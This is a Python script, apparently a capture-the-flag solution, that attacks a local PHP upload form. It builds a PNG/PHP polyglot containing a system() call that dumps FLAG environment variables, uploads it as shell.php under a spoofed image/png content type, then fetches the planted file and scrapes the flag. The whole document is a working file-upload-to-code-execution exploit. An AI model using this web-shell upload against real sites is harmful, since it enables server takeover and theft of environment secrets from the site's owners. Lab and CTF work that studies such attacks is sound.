import urllib.request
import urllib.parse
import re

base_url = "http://127.0.0.1:32818"

# Minimal PNG/PHP polyglot
polyglot = (
    b'\x89PNG\r\n\x1a\n'
    b'\x00\x00\x00\x0dIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x00\x00\x00\x00\x3a\x7e\x9b\x55'
    b'\x00\x00\x00\x0aIDAT\x78\x9c\x62\x00\x00\x00\x02\x00\x01\xe2\x21\xbc\x33'
    b'<?php system("printenv | grep FLAG"); ?>'
    b'\x00\x00\x00\x00IEND\xae\x42\x60\x82'
)

print(f"[+] Polyglot: {len(polyglot)} bytes")

# Prepare multipart form data manually
boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
body = []
body.append(f'--{boundary}'.encode())
body.append(b'Content-Disposition: form-data; name="userfile"; filename="shell.php"')
body.append(b'Content-Type: image/png')
body.append(b'')
body.append(polyglot)
body.append(f'--{boundary}'.encode())
body.append(b'Content-Disposition: form-data; name="submit"')
body.append(b'')
body.append(b'Upload File')
body.append(f'--{boundary}--'.encode())
body.append(b'')

body_bytes = b'\r\n'.join(body)

# Upload
print("\n[+] Uploading shell.php...")
try:
    req = urllib.request.Request(
        f"{base_url}/index.php",
        data=body_bytes,
        headers={'Content-Type': f'multipart/form-data; boundary={boundary}'}
    )
    with urllib.request.urlopen(req, timeout=5) as response:
        upload_result = response.read().decode('utf-8', errors='ignore')
        print(f"[+] Upload Status: {response.status}")
        print(f"[+] Upload Response:\n{upload_result}")
except Exception as e:
    print(f"[!] Upload error: {e}")

# Access uploaded file
print("\n[+] Accessing /upload/shell.php...")
try:
    req = urllib.request.Request(f"{base_url}/upload/shell.php")
    with urllib.request.urlopen(req, timeout=5) as response:
        access_result = response.read().decode('utf-8', errors='ignore')
        print(f"[+] Access Status: {response.status}")
        print(f"[+] Access Response:\n{access_result}")
        
        # Search for FLAG
        flags = re.findall(r'FLAG\{[^}]+\}', access_result)
        if flags:
            for flag in flags:
                print(f"\n[!!!] FLAG FOUND: {flag}")
except Exception as e:
    print(f"[!] Access error: {e}")

